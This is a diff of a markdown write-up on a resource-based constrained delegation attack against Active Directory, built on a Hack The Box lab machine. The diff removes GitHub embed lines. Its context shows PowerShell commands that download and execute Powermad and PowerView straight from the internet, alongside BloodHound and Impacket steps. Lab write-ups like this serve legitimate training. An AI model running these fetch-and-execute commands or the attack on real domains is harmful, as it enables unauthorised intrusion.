@@ -57,9 +57,6 @@ In order to explain this attack, we will use the [Support](https://www.hackthebo
 
 The easiest way to enumerate RBCD misconfigurations is using **BloodHound**. Mark your current user as owned and perform the **"Shortest Paths from Owned Principles"** query.
 
-::github{repo="SpecterOps/BloodHound"}
-
-
 <figure><img src="https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2Fyxfqm0qieV9xXw47hJxw%2Fimage.png?alt=media&#x26;token=8da120cd-982c-4fa1-8678-1e83d664bb9e" alt=""><figcaption></figcaption></figure>
 
 
@@ -82,8 +79,6 @@ First we will need to download and import `PowerMad.ps1`
  **PowerMad** is a **PowerShell toolkit** for Active Directory that enables **machine account creation and DNS record manipulation** using standard domain user privileges for `RBCD` attacks.
 :::
 
-::github{repo="Kevin-Robertson/Powermad"}
-
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1')
 Import-Module Powermad.ps1
@@ -93,8 +88,6 @@ And `PowerView.ps1`
 :::note
 **PowerView** is a **PowerShell reconnaissance tool** for Active Directory that enables **permission enumeration, object querying, and attack path discovery** through extensive AD property and ACL analysis.
 :::
-
-::github{repo="PowerShellMafia/PowerSploit"}
 
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
@@ -190,8 +183,6 @@ In order to continue with the exploitation, we need to install `impacket` if we 
 :::note
 **Impacket** is a **collection of Python classes and scripts for working with network protocols** that provides programmatic low-level access to protocols like SMB, MSRPC, Kerberos, and LDAP for penetration testing and red team operations.
 :::
-
-::github{repo="fortra/impacket"}
 
 ## 4.2 Create the Machine Account
 
